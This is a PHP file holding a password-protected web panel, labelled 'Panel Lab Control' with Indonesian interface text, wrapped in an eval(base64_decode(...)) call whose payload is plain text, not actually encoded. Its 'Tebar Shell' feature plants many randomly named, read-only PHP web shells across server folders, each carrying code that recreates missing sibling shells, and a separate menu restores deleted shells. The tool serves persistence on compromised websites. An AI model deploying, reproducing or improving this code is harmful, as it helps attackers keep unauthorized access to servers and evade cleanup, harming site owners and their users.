<?php eval(base64_decode('<?php
session_start();
date_default_timezone_set("Asia/Jakarta");

$script_pass = "Hadii Haxor"; // password panel
if(!isset($_SESSION['login'])){
    if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['script_pass'])){
        if($_POST['script_pass']===$script_pass){
            $_SESSION['login']=true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else { echo "<h3>Password salah!</h3>"; }
    }
    echo '<form method="post">
            <label>Masukkan password untuk akses panel:</label><br>
            <input type="password" name="script_pass">
            <input type="submit" value="Login">
          </form>';
    exit;
}

function rand_string($length=5){
    $chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $str=''; for($i=0;$i<$length;$i++){$str.=$chars[rand(0,strlen($chars)-1)];} return $str;
}
function rand_password($words=4){
    $chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $pass=''; for($i=0;$i<$words;$i++){$pass.=substr(str_shuffle($chars),0,4);} return $pass;
}

$menu = $_GET['menu'] ?? '';
echo "<h2>Panel Lab Control</h2>
<ul>
<li><a href='?menu=scan'>1. Scan File by Time</a></li>
<li><a href='?menu=tebar'>2. Tebar Shell</a></li>
<li><a href='?menu=recreate'>3. Re-Create + Chmod + Proteksi Shell (Mutual Protection)</a></li>
<li><a href='?menu=logout'>Logout</a></li>
</ul>";

if($menu==='logout'){ session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit; }

if($menu==='scan'){
    if(!isset($_POST['date'])){
        echo "<h3>Scan File by Time</h3>
              <form method='post'>
                Tanggal (YYYY-MM-DD): <input type='text' name='date'>
                <input type='submit' value='Scan'>
              </form>";
    } else {
        $inputDate = strtotime($_POST['date']);
        $today = time();
        echo "<h3>Hasil Scan dari ".$_POST['date']." s/d ".date("Y-m-d")."</h3><ul>";
        foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator(".")) as $file){
            if($file->isFile()){
                $ctime=$file->getCTime();
                if($ctime>=$inputDate && $ctime<=$today){
                    echo "<li>".$file->getPathname()." (".date("Y-m-d H:i:s",$ctime).")</li>";
                }
            }
        }
        echo "</ul>";
    }
}

if($menu==='tebar'){
    if(!isset($_POST['paths'])){
        echo "<h3>Tebar Shell</h3>
              <form method='post'>
                Path Target (pisahkan koma):<br>
                <input type='text' name='paths' value='./test1,./test2' size='50'><br><br>
                
                Isi File (PHP code):<br>
                <textarea name='content' rows='5' cols='50'><?php echo 'Hello World'; ?></textarea><br><br>
                
                Pilih Format (max 3, pisahkan koma):<br>
                <input type='text' name='formats' value='php,phtml,php7'><br><br>
                
                <input type='submit' value='Tebar Shell'>
              </form>";
    } else {
        $paths = explode(',', $_POST['paths']);
        $content = $_POST['content'];
        $formats = explode(',', $_POST['formats']);
        if(count($formats)>3){ $formats=array_slice($formats,0,3); }

        $path_file=fopen("path.txt","w");
        $shell_file=fopen("shell.txt","w");

        foreach($paths as $folder){
            $folder=trim($folder);
            if(!is_dir($folder)){ mkdir($folder,0777,true); }
            echo "<h3>Folder: $folder</h3><ul>";

            for($i=0;$i<3;$i++){
                $rand_name=rand_string(5);
                fwrite($shell_file,$rand_name."\n");

                foreach($formats as $ext){
                    $password=rand_password(4);
                    $full_path=$folder."/".$rand_name.".".$ext;

                    $file_content='<?php
$password="'.$password.'";
if(!isset($_POST["pass"]) || $_POST["pass"]!==$password){
    echo "<form method=\'post\'>Password: <input type=\'password\' name=\'pass\'>
    <input type=\'submit\' value=\'Login\'></form>";
    exit;
}

if(file_exists("path.txt")){
    $lines=file("path.txt", FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES);
    foreach($lines as $line){
        list($f,$fl,$pw)=preg_split("/ => /",$line);
        $f=trim($f); $fl=trim($fl); $pw=trim($pw);
        $fp=$f."/".$fl;
        if(!file_exists($fp)){
            $fc="<?php
$password=\"$pw\";
if(!isset(\$_POST[\"pass\"]) || \$_POST[\"pass\"]!==\$password){
    echo \'<form method=\\\'post\\\'>Password: <input type=\\\'password\\\' name=\\\'pass\\\'><input type=\\\'submit\\\' value=\\\'Login\\\'></form>\';
    exit;
}
?>\n<?php echo \"Recovered shell\";?>";
            if(!is_dir($f)){ mkdir($f,0777,true); }
            file_put_contents($fp,$fc);
            chmod($fp,0444);
        }
    }
}
?>'."\n".$content;

                    file_put_contents($full_path,$file_content);
                    chmod($full_path,0444);
                    fwrite($path_file,"$folder => ".$rand_name.".".$ext." => $password\n");
                    echo "<li>".$rand_name.".".$ext." | Password: $password</li>";
                }
            }
            echo "</ul>";
        }

        fclose($path_file);
        fclose($shell_file);
        echo "<h3>Tebar shell selesai. Output disimpan di path.txt dan shell.txt</h3>";
    }
}

if($menu==='recreate'){
    if(!file_exists("path.txt") || !file_exists("shell.txt")){
        echo "<h3>path.txt atau shell.txt tidak ditemukan. Tebar shell terlebih dahulu.</h3>";
        exit;
    }
    $lines=file("path.txt",FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES);
    echo "<h3>Re-Create Shells Manual</h3><ul>";
    foreach($lines as $line){
        list($folder,$file,$password)=preg_split("/ => /",$line);
        $folder=trim($folder); $file=trim($file); $password=trim($password);
        $full_path=$folder."/".$file;
        if(!file_exists($full_path)){
            $file_content='<?php
$password="'.$password.'";
if(!isset($_POST["pass"]) || $_POST["pass"]!==$password){
    echo "<form method=\'post\'>Password: <input type=\'password\' name=\'pass\'>
    <input type=\'submit\' value=\'Login\'></form>";
    exit;
}
?>'."\n<?php echo 'Recovered shell'; ?>";
            if(!is_dir($folder)){ mkdir($folder,0777,true); }
            file_put_contents($full_path,$file_content);
            chmod($full_path,0444);
            echo "<li>Recreated: $full_path | Password: $password</li>";
        }
    }
    echo "</ul><h3>Re-create selesai.</h3>";
}
?>')); ?>